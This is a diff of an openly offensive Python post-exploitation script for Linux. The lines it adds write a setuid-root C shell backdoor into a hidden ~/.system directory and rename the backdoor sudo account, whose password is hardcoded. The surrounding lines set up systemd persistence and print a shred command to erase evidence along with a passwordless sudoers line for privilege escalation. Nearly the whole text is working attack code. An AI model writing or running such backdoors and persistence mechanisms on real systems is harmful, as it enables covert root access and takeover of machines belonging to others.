@@ -40,20 +40,24 @@ if __name__ == "__main__":
             print(e)
 """
 
+hiddenBackdoorC="""
+int main() { setresuid(0,0,0); system("/bin/sh"); }
+"""
+
 backdoor = """
 #!/bin/bash
 
 PASSWORD="sickkick"
-USERNAME="sysd"
+USERNAME="nautilus"
 
 if id -u "$USERNAME" >/dev/null 2>&1; then
     userdel -r -f $USERNAME
-    useradd -m -p $PASSWORD -s /bin/bash $USERNAME
+    useradd -M -p $PASSWORD -s /bin/bash $USERNAME
     usermod -a -G sudo $USERNAME
     echo $USERNAME:$PASSWORD | chpasswd
 
 else
-    useradd -m -p $PASSWORD -s /bin/bash $USERNAME
+    useradd -M -p $PASSWORD -s /bin/bash $USERNAME
     usermod -a -G sudo $USERNAME
     echo $USERNAME:$PASSWORD | chpasswd
 fi
@@ -87,6 +91,7 @@ os.system("rm inject.sh")
 print("Cleaned up backdoor")
 
 # ---------- Persistence
+# Save the payload to /tmp/boot64.py
 print("Gaining persistence through systemd...")
 os.system("mkdir /opt/boot64")
 
@@ -99,5 +104,20 @@ with open("/lib/systemd/system/boot64.service", "w+") as file:
 os.system("chown -R {} /opt/boot64/".format(homeUser))
 os.system("systemctl enable boot64.service && systemctl start boot64.service")
 print("Boot64 injected into boot")
+
+hiddenBackdoor = str(Path.home()) + "/.system/system.c"
+print("Injecting a hidden backdoor to {}".format(hiddenBackdoor))
+os.system("mkdir {}".format(str(Path.home())+"/.system"))
+with open(hiddenBackdoor, "w+") as file:
+    file.write(hiddenBackdoorC)
+
+os.system("gcc -o {} {}".format(hiddenBackdoor[:-2], hiddenBackdoor))
+os.system("chown -R {} {}".format(homeUser, str(Path.home())+"/.system"))
+os.system("chown root:root {} && chmod u+s {}".format(hiddenBackdoor[:-2], hiddenBackdoor[:-2]))
+
+print("Backdoored {}".format(hiddenBackdoor[:-2]))
+
+
 print("Use this to cleanup: shred -v -n 25 -u -z inject.py")
+print("Add this for another backdoor privesc\nuser ALL=(ALL) NOPASSWD:ALL\nsudo -e /etc/sudoers")
 print("Done!")
